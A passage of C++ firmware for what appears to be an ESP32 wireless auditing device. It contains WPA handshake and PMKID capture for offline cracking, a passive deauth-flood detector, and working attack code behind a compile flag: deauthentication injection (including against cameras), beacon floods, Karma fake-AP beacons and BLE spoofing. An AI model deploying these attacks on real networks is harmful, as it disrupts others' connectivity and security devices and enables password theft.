    // M1 (from AP): ANONCE, and possibly a PMKID in the key data.
    memcpy(slot->anonce, nonce, 32);
    memcpy(slot->replayM1, replay, 8);
    slot->haveM1 = true;
    if (kdLen > 0 && EAPOL_FIXED_LEN + kdLen <= eapolLen) {
      const uint8_t* kd = eapol + EAPOL_FIXED_LEN;
      int i = 0;
      while (i + 2 <= kdLen) {
        const uint8_t tag = kd[i];
        const uint8_t tl = kd[i + 1];
        if (i + 2 + tl > kdLen) break;
        // PMKID KDE: DD <len> 00 0F AC 04 <16-byte PMKID>
        if (tag == 0xDD && tl >= 0x14 && kd[i + 2] == 0x00 && kd[i + 3] == 0x0F && kd[i + 4] == 0xAC &&
            kd[i + 5] == 0x04) {
          memcpy(slot->pmkid, kd + i + 6, 16);
          bool nonZero = false;
          for (int z = 0; z < 16; z++)
            if (slot->pmkid[z]) {
              nonZero = true;
              break;
            }
          if (nonZero) slot->havePmkid = true;
          break;
        }
        i += 2 + tl;
      }
    }
  } else if (kMic && !kAck && kdLen > 0) {
    // M2 (from STA): MIC + the EAPOL frame used for cracking (MIC field zeroed).
    memcpy(slot->replayM2, replay, 8);
    memcpy(slot->mic, eapol + 81, 16);
    int copyLen = EAPOL_FIXED_LEN + kdLen;
    if (copyLen > eapolLen) copyLen = eapolLen;
    if (copyLen > HS_EAPOL_MAX) copyLen = HS_EAPOL_MAX;
    memcpy(slot->eapol, eapol, copyLen);
    if (copyLen >= 97) memset(slot->eapol + 81, 0, 16);  // zero MIC for hc22000
    slot->eapolLen = static_cast<uint16_t>(copyLen);
    slot->haveM2 = true;
  }
}

// ---- Deauth / disassoc flood detector (passive, defensive) ----
// Counts management deauth (subtype 12) / disassoc (subtype 10) frames per
// transmitter while channel-hopping. A handful is normal; a sustained burst from
// one source is the signature of a deauth attack. The callback only tallies into
// static slots (no SD I/O in Wi-Fi context); the activity loop writes alerts.
constexpr int DD_MAX_SLOTS = 16;
constexpr uint16_t DD_ALERT_THRESHOLD = 16;  // frames from one source before flagging

struct DeauthSrc {
  bool used;
  uint8_t src[6];    // addr2 (transmitter)
  uint8_t bssid[6];  // addr3
  volatile uint16_t deauthCount;
  volatile uint16_t disassocCount;
  volatile int8_t lastRssi;
  volatile uint8_t lastChannel;
  bool reported;  // alert line already written for this source
};

struct DeauthDetect {
  volatile bool active;
  DeauthSrc slots[DD_MAX_SLOTS];
  volatile uint32_t totalFrames;
};
std::unique_ptr<DeauthDetect> g_dd;  // allocated only while the detector runs

void deauthDetectCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!g_dd || !g_dd->active) return;
  if (type != WIFI_PKT_MGMT) return;
  PromiscFrame fr;
  if (!parsePromiscFrame(buf, fr)) return;
  const uint8_t* p = fr.p;
  const uint8_t ftype = fr.ftype;
  const uint8_t fsub = fr.fsub;
  if (ftype != 0) return;                // management frames only
  if (fsub != 12 && fsub != 10) return;  // 12 = deauth, 10 = disassoc

  const uint8_t* src = p + 10;    // addr2 transmitter
  const uint8_t* bssid = p + 16;  // addr3
  g_dd->totalFrames++;

  DeauthSrc* slot = nullptr;
  for (auto& s : g_dd->slots) {
    if (s.used && macEq(s.src, src)) {
      slot = &s;
      break;
    }
  }
  if (!slot) {
    for (auto& s : g_dd->slots) {
      if (!s.used) {
        s.used = true;
        memcpy(s.src, src, 6);
        memcpy(s.bssid, bssid, 6);
        s.deauthCount = 0;
        s.disassocCount = 0;
        s.reported = false;
        slot = &s;
        break;
      }
    }
  }
  if (!slot) return;  // table full -- ignore further new sources

  if (fsub == 12)
    slot->deauthCount++;
  else
    slot->disassocCount++;
  slot->lastRssi = fr.rssi;
  slot->lastChannel = fr.channel;
}

#if defined(RADIO_AUDIT_ENABLE_ACTIVE)
// ---- Active attacks (deauth / beacon flood) ----
// Authorized testing only. Gated behind RADIO_AUDIT_ENABLE_ACTIVE + a one-time
// per-session confirmation. Persists for the process lifetime (until reboot).
bool g_activeAuthorized = false;
const uint8_t BROADCAST_MAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

uint8_t g_deauthFrame[26] = {
    0xC0, 0x00,                          // FC: mgmt, subtype 12 (deauth)
    0x00, 0x00,                          // duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // [4]  DA (target client / broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // [10] SA = AP BSSID
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // [16] BSSID = AP
    0x00, 0x00,                          // seq
    0x07, 0x00,                          // reason 7 (class-3 frame from nonassoc STA)
};
uint8_t g_beaconFrame[128];

// Inject `rounds` deauth + disassoc frames spoofing `ap` toward `client`
// (broadcast kicks every associated station). Caller sets the channel first.
int sendDeauthBurst(const uint8_t* ap, const uint8_t* client, int rounds) {
  memcpy(g_deauthFrame + 4, client, 6);
  memcpy(g_deauthFrame + 10, ap, 6);
  memcpy(g_deauthFrame + 16, ap, 6);
  int sent = 0;
  for (int r = 0; r < rounds; r++) {
    g_deauthFrame[0] = 0xC0;  // deauth
    if (esp_wifi_80211_tx(WIFI_IF_STA, g_deauthFrame, sizeof(g_deauthFrame), false) == ESP_OK) sent++;
    g_deauthFrame[0] = 0xA0;  // disassoc
    if (esp_wifi_80211_tx(WIFI_IF_STA, g_deauthFrame, sizeof(g_deauthFrame), false) == ESP_OK) sent++;
  }
  return sent;
}

// Transmit `rounds` beacons with random BSSIDs/SSIDs on the current channel.
int sendBeaconFlood(uint8_t channel, int rounds) {
  int sent = 0;
  for (int r = 0; r < rounds; r++) {
    int i = 0;
    g_beaconFrame[i++] = 0x80;  // FC: beacon
    g_beaconFrame[i++] = 0x00;
    g_beaconFrame[i++] = 0x00;  // duration
    g_beaconFrame[i++] = 0x00;
    for (int j = 0; j < 6; j++) g_beaconFrame[i++] = 0xFF;  // DA broadcast
    const uint8_t src[6] = {0x00, 0x16, 0x3e, static_cast<uint8_t>(esp_random()),
                            static_cast<uint8_t>(esp_random()), static_cast<uint8_t>(esp_random())};
    memcpy(g_beaconFrame + i, src, 6);  // SA
    i += 6;
    memcpy(g_beaconFrame + i, src, 6);  // BSSID
    i += 6;
    g_beaconFrame[i++] = 0x00;  // seq
    g_beaconFrame[i++] = 0x00;
    memset(g_beaconFrame + i, 0, 8);  // timestamp
    i += 8;
    g_beaconFrame[i++] = 0x64;  // beacon interval 100 TU
    g_beaconFrame[i++] = 0x00;
    g_beaconFrame[i++] = 0x01;  // capability info (ESS)
    g_beaconFrame[i++] = 0x00;
    char ssid[12];
    const int n = snprintf(ssid, sizeof(ssid), "FREE-%04X", static_cast<unsigned>(esp_random() & 0xFFFF));
    g_beaconFrame[i++] = 0x00;  // SSID IE tag
    g_beaconFrame[i++] = static_cast<uint8_t>(n);
    memcpy(g_beaconFrame + i, ssid, n);
    i += n;
    g_beaconFrame[i++] = 0x01;  // supported rates IE
    g_beaconFrame[i++] = 0x08;
    const uint8_t rates[8] = {0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
    memcpy(g_beaconFrame + i, rates, 8);
    i += 8;
    g_beaconFrame[i++] = 0x03;  // DS parameter set (channel)
    g_beaconFrame[i++] = 0x01;
    g_beaconFrame[i++] = channel;
    if (esp_wifi_80211_tx(WIFI_IF_STA, g_beaconFrame, i, false) == ESP_OK) sent++;
  }
  return sent;
}

// ---- Karma / probe-response (active) ----
// Harvest the SSIDs clients probe for (their Preferred Network List), then
// beacon those names back so the clients reveal themselves / attempt to
// associate -- a Karma (a.k.a. MANA) style probe response. The promiscuous
// callback only tallies harvested SSIDs; the attack loop transmits the beacons.
constexpr int KARMA_MAX_SSIDS = 32;
struct KarmaState {
  volatile bool active;
  char ssids[KARMA_MAX_SSIDS][33];
  volatile uint8_t count;
  volatile uint16_t probeReqs;  // directed probe requests seen
};
std::unique_ptr<KarmaState> g_karma;  // allocated only while Karma runs

void karmaProbeCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!g_karma || !g_karma->active) return;
  if (type != WIFI_PKT_MGMT) return;
  PromiscFrame fr;
  if (!parsePromiscFrame(buf, fr)) return;
  const uint8_t* p = fr.p;
  const int len = fr.len;
  if (fr.ftype != 0 || fr.fsub != 4) return;  // probe request only

  // SSID IE (tag 0) is the first tagged field after the 24-byte header.
  const int off = 24;
  if (off + 2 > len) return;
  if (p[off] != 0) return;  // first IE must be SSID
  const uint8_t slen = p[off + 1];
  if (slen == 0 || slen > 32) return;  // broadcast/wildcard or invalid -> ignore
  if (off + 2 + slen > len) return;
  char ssid[33];
  memcpy(ssid, p + off + 2, slen);
  ssid[slen] = '\0';

  g_karma->probeReqs++;
  for (uint8_t k = 0; k < g_karma->count; k++)
    if (strncmp(g_karma->ssids[k], ssid, 33) == 0) return;  // already harvested
  if (g_karma->count < KARMA_MAX_SSIDS) {
    strncpy(g_karma->ssids[g_karma->count], ssid, 32);
    g_karma->ssids[g_karma->count][32] = '\0';
    g_karma->count++;
  }
}

// Transmit one beacon advertising `ssid` on `channel`. The BSSID is derived from
// the SSID so each fake network keeps a stable address across bursts.
int sendKarmaBeacon(uint8_t channel, const char* ssid) {
  const int slen = static_cast<int>(strlen(ssid));
  if (slen <= 0 || slen > 32) return 0;
  int i = 0;
  g_beaconFrame[i++] = 0x80;  // FC: beacon
  g_beaconFrame[i++] = 0x00;
  g_beaconFrame[i++] = 0x00;  // duration
  g_beaconFrame[i++] = 0x00;
  for (int j = 0; j < 6; j++) g_beaconFrame[i++] = 0xFF;  // DA broadcast
  uint8_t bssid[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
  for (int j = 0; j < slen; j++) bssid[2 + (j % 4)] ^= static_cast<uint8_t>(ssid[j]);
  memcpy(g_beaconFrame + i, bssid, 6);  // SA
  i += 6;
  memcpy(g_beaconFrame + i, bssid, 6);  // BSSID
  i += 6;
  g_beaconFrame[i++] = 0x00;  // seq
  g_beaconFrame[i++] = 0x00;
  memset(g_beaconFrame + i, 0, 8);  // timestamp
  i += 8;
  g_beaconFrame[i++] = 0x64;  // beacon interval 100 TU
  g_beaconFrame[i++] = 0x00;
  g_beaconFrame[i++] = 0x01;  // capability info (ESS, open)
  g_beaconFrame[i++] = 0x00;
  g_beaconFrame[i++] = 0x00;  // SSID IE tag
  g_beaconFrame[i++] = static_cast<uint8_t>(slen);
  memcpy(g_beaconFrame + i, ssid, slen);
  i += slen;
  g_beaconFrame[i++] = 0x01;  // supported rates IE
  g_beaconFrame[i++] = 0x08;
  const uint8_t rates[8] = {0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
  memcpy(g_beaconFrame + i, rates, 8);
  i += 8;
  g_beaconFrame[i++] = 0x03;  // DS parameter set (channel)
  g_beaconFrame[i++] = 0x01;
  g_beaconFrame[i++] = channel;
  return esp_wifi_80211_tx(WIFI_IF_STA, g_beaconFrame, i, false) == ESP_OK ? 1 : 0;
}
#endif  // RADIO_AUDIT_ENABLE_ACTIVE
}  // namespace

// Vendor name for a "AA:BB:CC:.." MAC. Binary-searches the SD OUI database
// (opened in onEnter). Returns a name, "randomized" for locally-administered
// MACs, or "" if unknown / the database is not on the SD card. A small ring
// cache short-circuits repeats so a scan's worth of lookups stays cheap.
namespace ra {
std::string macVendor(const std::string& mac) {
  unsigned int b0, b1, b2;
  if (sscanf(mac.c_str(), "%x:%x:%x", &b0, &b1, &b2) != 3) return "";
  if (b0 & 0x02) return "randomized";  // locally administered -> likely a random MAC
  const uint32_t oui = (b0 << 16) | (b1 << 8) | b2;

  for (const auto& e : g_ouiCache)
    if (e.valid && e.oui == oui) return std::string(e.name);

  std::string result;  // empty = unknown
  if (g_ouiFile.isOpen() && g_ouiCount > 0) {
    int lo = 0, hi = static_cast<int>(g_ouiCount) - 1;
    uint8_t rec[OUI_RECORD_SIZE];
    while (lo <= hi) {
      const int mid = lo + (hi - lo) / 2;
      if (!g_ouiFile.seek(OUI_HEADER_SIZE + static_cast<size_t>(mid) * OUI_RECORD_SIZE)) break;
      if (g_ouiFile.read(rec, OUI_RECORD_SIZE) != static_cast<int>(OUI_RECORD_SIZE)) break;
      uint32_t key;
      memcpy(&key, rec, 4);  // little-endian, matches gen_oui.py
      if (key == oui) {
        rec[OUI_RECORD_SIZE - 1] = '\0';  // guarantee NUL-terminated name
        result.assign(reinterpret_cast<const char*>(rec + 4));
        break;
      }
      if (key < oui)
        lo = mid + 1;
      else
        hi = mid - 1;
    }
  }

  // Cache the result (hit or miss) in the ring so repeats skip the SD search.
  OuiCacheEntry& slot = g_ouiCache[g_ouiCacheNext];
  slot.valid = true;
  slot.oui = oui;
  strncpy(slot.name, result.c_str(), sizeof(slot.name) - 1);
  slot.name[sizeof(slot.name) - 1] = '\0';
  g_ouiCacheNext = (g_ouiCacheNext + 1) % OUI_CACHE_SIZE;
  return result;
}
}  // namespace ra

void RadioAuditActivity::onEnter() {
  Activity::onEnter();
  selectedAction = 0;
  currentCategory = -1;
  selectedCategory = 0;
  selectedItem = 0;
  showingDetails = false;
  showingFindings = false;
  showingTarget = false;
  showingCameraList = false;
  targetMenuOpen = false;
  targetIsCamera = false;
  locating = false;
  targetLocatable = false;
  clientFindings.clear();

  // Reserve the result vectors up front, while the heap is freshest and least
  // fragmented. Scans clear() (which keeps capacity) then push_back, so they
  // never reallocate mid-scan -- a reallocation under BLE-fragmented heap was
  // throwing bad_alloc -> abort(). Caps match the merge-time limits.
  wifiFindings.reserve(MAX_WIFI_FINDINGS);
  bleFindings.reserve(MAX_BLE_FINDINGS);
  clientFindings.reserve(CLIENT_MAX);
  probeFindings.reserve(PROBE_MAX);
  auditFindings.reserve(96);

  ouiOpen();  // open the SD OUI database for vendor lookups (closed in onExit)

  status = "Ready";
  requestUpdate();
}

void RadioAuditActivity::onExit() {
  Activity::onExit();
  if (capturing) {
    // Tear down promiscuous capture and close the SD file before destruction.
    g_pcap.active = false;
    if (g_hs) g_hs->active = false;
    if (g_dd) g_dd->active = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    if (captureMode == CaptureMode::Pcap)
      pcapDrain(captureFile);
    else if (captureMode == CaptureMode::DeauthDetect)
      processDeauthDetect();
    else
      processHandshakes();
    captureFile.flush();
    captureFile.close();
    capturing = false;
    g_pcap.buf = nullptr;
    g_pcapBuf.reset();  // return the 32 KB ring to the heap
    g_hs.reset();       // return the handshake slot table to the heap
    g_dd.reset();       // return the detector slot table to the heap
  }
  if (locating) {
    locating = false;
    esp_wifi_set_promiscuous(false);
  }
#if defined(RADIO_AUDIT_ENABLE_ACTIVE)
  if (state == State::ATTACKING) {
#if defined(RADIO_AUDIT_ENABLE_BLE)
    if (attackMode == AttackMode::BleSpoof) {
      BLEDevice::getAdvertising()->stop();
      shutdownBleController();
    }
#endif
    if (attackMode == AttackMode::Karma) {
      if (g_karma) g_karma->active = false;
      esp_wifi_set_promiscuous(false);
      esp_wifi_set_promiscuous_rx_cb(nullptr);
      g_karma.reset();
    }
    WiFi.disconnect(false, false);
    WiFi.mode(WIFI_OFF);
  }
#endif
  ouiClose();  // close the SD OUI database handle
  WiFi.scanDelete();
  shutdownBleController();
}

void RadioAuditActivity::loop() {
  if (state == State::WIFI_SCANNING) {
    processWifiScan();
    return;
  }

  // Live capture (PCAP or handshake): process new frames to SD every tick, hop
  // channels, refresh counters. Back stops; in handshake mode Confirm fires an
  // in-screen deauth to force a handshake (no need to leave the screen).
  if (state == State::CAPTURING) {
    if (mappedInput.wasPressed(MappedInputManager::Button::Back)) {
      if (captureMode == CaptureMode::Pcap) stopPcapCapture();
      else if (captureMode == CaptureMode::DeauthDetect) stopDeauthDetect();
      else stopHandshakeCapture();
      return;
    }
    if (mappedInput.wasPressed(MappedInputManager::Button::Confirm)) {
      if (captureMode == CaptureMode::Pcap) {
        stopPcapCapture();
        return;
      }
      if (captureMode == CaptureMode::DeauthDetect) {
        stopDeauthDetect();
        return;
      }
#if defined(RADIO_AUDIT_ENABLE_ACTIVE)
      handshakeDeauthTarget();  // force the target to reconnect; channel locks on
      return;
#else
      stopHandshakeCapture();
      return;
#endif
    }
    if (captureMode == CaptureMode::Pcap) captureBytesWritten += pcapDrain(captureFile);
    else if (captureMode == CaptureMode::DeauthDetect) processDeauthDetect();
    else processHandshakes();
    const uint32_t now = millis();
    if (!captureChannelLocked && now - captureLastHopMs >= 300) {
      captureChannel = (captureChannel >= 13) ? 1 : static_cast<uint8_t>(captureChannel + 1);
      esp_wifi_set_channel(captureChannel, WIFI_SECOND_CHAN_NONE);
      captureLastHopMs = now;
    }
    if (now - captureLastFlushMs >= 1500) {
      captureFile.flush();
      captureLastFlushMs = now;
      requestUpdate();  // refresh on-screen counters
    }
    return;
  }

#if defined(RADIO_AUDIT_ENABLE_ACTIVE)
  // Active attack loop (deauth / beacon flood): aggressive bursts, Back stops.
  if (state == State::ATTACKING) {
    if (mappedInput.wasPressed(MappedInputManager::Button::Back) ||
        mappedInput.wasPressed(MappedInputManager::Button::Confirm)) {
      stopAttack();
      return;
    }
    const uint32_t now = millis();
    const uint32_t burstInterval = (attackMode == AttackMode::BleSpoof) ? 250 : 50;
    if (now - attackLastMs >= burstInterval) {
      if (attackMode == AttackMode::Deauth && !attackTargets.empty()) {
        const int idx = attackTargets[attackTargetIdx % attackTargets.size()];
        if (idx >= 0 && idx < static_cast<int>(wifiFindings.size())) {
          const auto& w = wifiFindings[idx];
          uint8_t ap[6];
          if (parseBssid(w.bssid, ap)) {
            const uint8_t ch = (w.channel >= 1 && w.channel <= 13) ? static_cast<uint8_t>(w.channel) : 1;
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            attackFrames += sendDeauthBurst(ap, BROADCAST_MAC, 8);
            attackStatusLine = (w.ssid.empty() ? w.bssid : w.ssid) + " CH" + std::to_string(ch);
          }
        }
        attackTargetIdx++;
      } else if (attackMode == AttackMode::Beacon) {
        captureChannel = (captureChannel >= 13) ? 1 : static_cast<uint8_t>(captureChannel + 1);
        esp_wifi_set_channel(captureChannel, WIFI_SECOND_CHAN_NONE);
        attackFrames += sendBeaconFlood(captureChannel, 8);
        attackStatusLine = std::string("CH") + std::to_string(captureChannel);
      } else if (attackMode == AttackMode::Karma) {
        // Beacon every harvested PNL entry on the next channel; the promiscuous
        // callback keeps adding SSIDs as clients probe for them.
        captureChannel = (captureChannel >= 13) ? 1 : static_cast<uint8_t>(captureChannel + 1);
        esp_wifi_set_channel(captureChannel, WIFI_SECOND_CHAN_NONE);
        const int n = g_karma ? g_karma->count : 0;
        for (int k = 0; k < n; k++) attackFrames += sendKarmaBeacon(captureChannel, g_karma->ssids[k]);
        attackStatusLine = std::string("PNL ") + std::to_string(n) + " / CH" + std::to_string(captureChannel);
      } else if (attackMode == AttackMode::BleSpoof) {
#if defined(RADIO_AUDIT_ENABLE_BLE)
        // Rotate a random phantom BLE advertiser each cycle.
        BLEAdvertising* adv = BLEDevice::getAdvertising();
        adv->stop();
        char nm[16];
        snprintf(nm, sizeof(nm), "RI-%04X", static_cast<unsigned>(esp_random() & 0xFFFF));
        char mfr[7];  // 6 non-zero bytes (Arduino String can't hold embedded nulls)
        for (int k = 0; k < 6; k++) mfr[k] = static_cast<char>((esp_random() % 255) + 1);
        mfr[6] = '\0';
        BLEAdvertisementData data;
        data.setName(String(nm));
        data.setManufacturerData(String(mfr));
        adv->setAdvertisementData(data);
        adv->start();
        attackFrames++;
        attackStatusLine = nm;
#endif
      } else if (attackMode == AttackMode::CameraDeauth) {
        esp_wifi_set_channel(captureChannel, WIFI_SECOND_CHAN_NONE);
        if (targetCamHasAp) {
          attackFrames += sendDeauthBurst(targetCamAp, targetCamMac, 8);  // directed: kick the client
          attackStatusLine = std::string("client ") + macToString(targetCamMac) + " CH" + std::to_string(captureChannel);
        } else {
          attackFrames += sendDeauthBurst(targetCamMac, BROADCAST_MAC, 8);  // AP cam: kick all clients
          attackStatusLine = std::string("AP ") + macToString(targetCamMac) + " CH" + std::to_string(captureChannel);
        }
      }
      attackLastMs = now;
    }
    if (now - captureLastFlushMs >= 2000) {
      captureLastFlushMs = now;
      requestUpdate();  // refresh frame counter (e-ink redraw pauses tx briefly)
    }
    return;
  }
#endif

  // Live "find it" RSSI locator: sample periodically, any button exits to detail.
  if (locating) {
    if (mappedInput.wasPressed(MappedInputManager::Button::Back) ||
        mappedInput.wasPressed(MappedInputManager::Button::Confirm)) {
      stopLocator();
      showingTarget = true;
      requestUpdate();
      return;
    }
    const uint32_t now = millis();
    if (locLastSampleMs == 0 || now - locLastSampleMs >= 700) {
      locPrevRssi = locHasSignal ? locCurRssi : locPrevRssi;
      locatorSample();
      locLastSampleMs = millis();
      requestUpdate();
    }
    return;
  }

  // Selectable list of camera-sweep hits: Confirm opens the detail (Locate/Deauth).
  if (showingCameraList) {
    if (mappedInput.wasPressed(MappedInputManager::Button::Back)) {
      showingCameraList = false;
      requestUpdate();
      return;
    }
    if (mappedInput.wasPressed(MappedInputManager::Button::Confirm)) {
      if (!cameraTargets.empty()) openCameraDetail(cameraSel);
      return;
    }
    const int n = static_cast<int>(cameraTargets.size());
    if (n > 0) {
      buttonNavigator.onNext([this, n] {
        cameraSel = ButtonNavigator::nextIndex(cameraSel, n);
        requestUpdate();
      });
      buttonNavigator.onPrevious([this, n] {
        cameraSel = ButtonNavigator::previousIndex(cameraSel, n);
        requestUpdate();
      });
    }
    return;
  }

  // Per-target deep-scan detail view: scroll lines; Confirm opens the action menu
  // (WiFi AP) or locates (BLE).
  if (showingTarget) {
    // Action menu overlay (mark / deauth / locate) for a WiFi AP.
    if (targetMenuOpen) {
      if (mappedInput.wasPressed(MappedInputManager::Button::Back)) {
        targetMenuOpen = false;
        requestUpdate();
        return;
      }
      if (mappedInput.wasPressed(MappedInputManager::Button::Confirm)) {
        if (!targetMenuCodes.empty()) runTargetMenuItem(targetMenuCodes[targetMenuSel]);
        return;
      }
      const int n = static_cast<int>(targetMenuCodes.size());
      if (n > 0) {
        buttonNavigator.onNext([this, n] {
          targetMenuSel = ButtonNavigator::nextIndex(targetMenuSel, n);
          requestUpdate();
        });
        buttonNavigator.onPrevious([this, n] {
          targetMenuSel = ButtonNavigator::previousIndex(targetMenuSel, n);
          requestUpdate();
        });
      }
      return;
    }
    if (mappedInput.wasPressed(MappedInputManager::Button::Back)) {
      showingTarget = false;
      showingCameraList = targetFromCameraList;  // back to the camera list if we came from it
      showingDetails = !targetFromCameraList && targetFromList;
      requestUpdate();
      return;
    }
    if (mappedInput.wasPressed(MappedInputManager::Button::Confirm)) {
      if (targetLocatable) {
        openTargetMenu();  // camera: locate/deauth; WiFi: mark/deauth/locate; BLE: GATT/locate
        return;
      }
      showingTarget = false;
      showingDetails = targetFromList;
      requestUpdate();
      return;
    }
    const int lineCount = static_cast<int>(targetLines.size());
    if (lineCount > 0) {
      buttonNavigator.onNext([this, lineCount] {
        targetScroll = ButtonNavigator::nextIndex(targetScroll, lineCount);
        requestUpdate();
      });
      buttonNavigator.onPrevious([this, lineCount] {
        targetScroll = ButtonNavigator::previousIndex(targetScroll, lineCount);
        requestUpdate();
      });
    }
    return;
  }

  if (showingDetails || showingFindings) {
    const int itemCount =
        showingFindings ? static_cast<int>(auditFindings.size())
                        : (showingBleDetails ? static_cast<int>(bleFindings.size()) : static_cast<int>(wifiFindings.size()));
    // Back closes the list. Select (Confirm) deep-scans the highlighted target.
    if (mappedInput.wasPressed(MappedInputManager::Button::Back)) {
      showingDetails = false;
      showingFindings = false;
      requestUpdate();
      return;
    }
    if (mappedInput.wasPressed(MappedInputManager::Button::Confirm)) {
      if (showingFindings) {
        // Jump to the related target's deep scan when the finding maps to one.
        if (itemCount > 0 && selectedFinding < itemCount) {
          const AuditFinding& f = auditFindings[selectedFinding];
          if (f.wifiIndex >= 0) {
            showingFindings = false;
            showingDetails = true;
            showingBleDetails = false;
            selectedFinding = f.wifiIndex;
            deepScanWifiTarget(f.wifiIndex);
            return;
          }
          if (f.bleIndex >= 0) {
            showingFindings = false;
            showingDetails = true;
            showingBleDetails = true;
            selectedFinding = f.bleIndex;
            deepScanBleTarget(f.bleIndex);
            return;
          }
        }
        showingFindings = false;
        requestUpdate();
        return;
      }
      if (itemCount > 0) {
        if (showingBleDetails) deepScanBleTarget(selectedFinding);
        else deepScanWifiTarget(selectedFinding);
      }
      return;
    }
    if (itemCount > 0) {
      buttonNavigator.onNext([this, itemCount] {
        selectedFinding = ButtonNavigator::nextIndex(selectedFinding, itemCount);
        requestUpdate();
      });
      buttonNavigator.onPrevious([this, itemCount] {
        selectedFinding = ButtonNavigator::previousIndex(selectedFinding, itemCount);
        requestUpdate();
      });
    }
    return;
  }

  if (currentCategory < 0) {
    // Top-level category list.
    if (mappedInput.wasPressed(MappedInputManager::Button::Back)) {
      onGoHome(HomeMenuItem::RADIO_AUDIT);
      return;
    }
    if (mappedInput.wasPressed(MappedInputManager::Button::Confirm)) {
      currentCategory = selectedCategory;
      selectedItem = 0;
      requestUpdate();
      return;
    }
    buttonNavigator.onNext([this] {
      selectedCategory = ButtonNavigator::nextIndex(selectedCategory, CATEGORY_COUNT);
      requestUpdate();
    });
    buttonNavigator.onPrevious([this] {
      selectedCategory = ButtonNavigator::previousIndex(selectedCategory, CATEGORY_COUNT);
      requestUpdate();
    });
    return;
  }

  // Inside a category: items run leaf actions; Back returns to the category list.
  const ActionCategory& cat = ACTION_CATEGORIES[currentCategory];
  if (mappedInput.wasPressed(MappedInputManager::Button::Back)) {
    currentCategory = -1;
    requestUpdate();
    return;
  }
  if (mappedInput.wasPressed(MappedInputManager::Button::Confirm)) {
    runAction(cat.items[selectedItem]);
    return;
  }
  buttonNavigator.onNext([this, &cat] {
    selectedItem = ButtonNavigator::nextIndex(selectedItem, cat.count);
    requestUpdate();
  });
  buttonNavigator.onPrevious([this, &cat] {
    selectedItem = ButtonNavigator::previousIndex(selectedItem, cat.count);
    requestUpdate();
  });
}

void RadioAuditActivity::runAction(Action action) {
  switch (action) {
    case Action::QuickScan: startScan(false, ScanScope::Both); return;
    case Action::DeepScan: startScan(true, ScanScope::Both); return;
    case Action::WifiScan: startScan(false, ScanScope::WifiOnly); return;
    case Action::BleScan: startScan(false, ScanScope::BleOnly); return;
    case Action::ClientRecon: startProbeScan(); return;
    case Action::ChannelUsage: showChannelUsage(); return;
    case Action::AuditFindings: showAuditFindings(); return;
    case Action::WifiResults: showWifiDetails(); return;
    case Action::BleResults: showBleDetails(); return;
    case Action::CameraSweep: startCameraSweep(); return;
    case Action::TrackerSweep: startTrackerSweep(); return;
    case Action::DeauthDetector: startDeauthDetect(); return;
    case Action::About: showAbout(); return;
    case Action::ExportText: exportText(); return;
    case Action::ExportCsv: exportCsv(); return;
    case Action::ExportJson: exportJson(); return;
    case Action::ExportWigle: exportWigle(); return;
    case Action::CapturePcap: startPcapCapture(); return;
    case Action::CaptureHandshake: startHandshakeCapture(); return;
    case Action::DeauthAttack:
    case Action::DeauthSelected:
    case Action::BeaconFlood:
    case Action::EvilTwin:
    case Action::BleSpoof:
    case Action::Karma:
    case Action::DeauthCameras:
#if defined(RADIO_AUDIT_ENABLE_ACTIVE)
      if (action == Action::DeauthAttack) startDeauthAttack();
      else if (action == Action::DeauthSelected) startDeauthSelected();
      else if (action == Action::BeaconFlood) startBeaconFlood();
      else if (action == Action::EvilTwin) startEvilTwin();
      else if (action == Action::BleSpoof) startBleSpoof();
      else if (action == Action::Karma) startKarma();
      else startDeauthCameras();
#endif
      return;
    case Action::COUNT: return;  // sentinel, never dispatched
  }
}

void RadioAuditActivity::startScan(bool deepScan, ScanScope scope) {
  deepScanMode = deepScan;
  scanScope = scope;
  scanTotalPasses = deepScan ? DEEP_SCAN_PASSES : QUICK_SCAN_PASSES;
  scanCurrentPass = 1;
  wifiFindings.clear();
  bleFindings.clear();
  auditFindings.clear();
  probeFindings.clear();
  beginScanPass();
}

void RadioAuditActivity::beginScanPass() {
  // BLE-only skips the Wi-Fi pass entirely; everything else starts with Wi-Fi
  // (which chains into BLE when the scope includes it).
  if (scanScope == ScanScope::BleOnly) {
    startBleScan();
  } else {
    startWifiScanPass();
  }
}

void RadioAuditActivity::startWifiScanPass() {
  state = State::WIFI_SCANNING;
  status = (String(deepScanMode ? "Deep WiFi pass " : "Scanning WiFi ") + scanCurrentPass + "/" + scanTotalPasses)
               .c_str();
  requestUpdate();

  resetWifiForScan();
  delay(250);
  WiFi.mode(WIFI_STA);
  delay(100);
  WiFi.scanNetworks(true, true);
}

void RadioAuditActivity::processWifiScan() {
  const int16_t result = WiFi.scanComplete();
  if (result == WIFI_SCAN_RUNNING) return;

  if (result == WIFI_SCAN_FAILED) {
    status = "WiFi scan failed";
    state = State::ERROR;
    requestUpdate();
    return;
  }

  for (int i = 0; i < result; i++) {
    WifiFinding finding;
    finding.ssid = WiFi.SSID(i).c_str();
    finding.bssid = WiFi.BSSIDstr(i).c_str();
    finding.rssi = WiFi.RSSI(i);
    finding.rssiMin = finding.rssi;
    finding.rssiMax = finding.rssi;
    finding.rssiSum = finding.rssi;
    finding.channel = WiFi.channel(i);
    finding.seenCount = 1;
    finding.auth = authName(WiFi.encryptionType(i));
    finding.hidden = finding.ssid.empty();
    mergeWifiFinding(std::move(finding));
  }
  std::sort(wifiFindings.begin(), wifiFindings.end(),
            [](const WifiFinding& a, const WifiFinding& b) { return a.rssi > b.rssi; });
  WiFi.scanDelete();

  if (scanScope == ScanScope::WifiOnly) {
    finishScanPass();
  } else {
    startBleScan();
  }
}

void RadioAuditActivity::prepWifiSta() {
  shutdownBleController();
  WiFi.scanDelete();
  WiFi.disconnect(false, false);
  WiFi.mode(WIFI_STA);
  delay(150);
}

void RadioAuditActivity::startBleScan() {
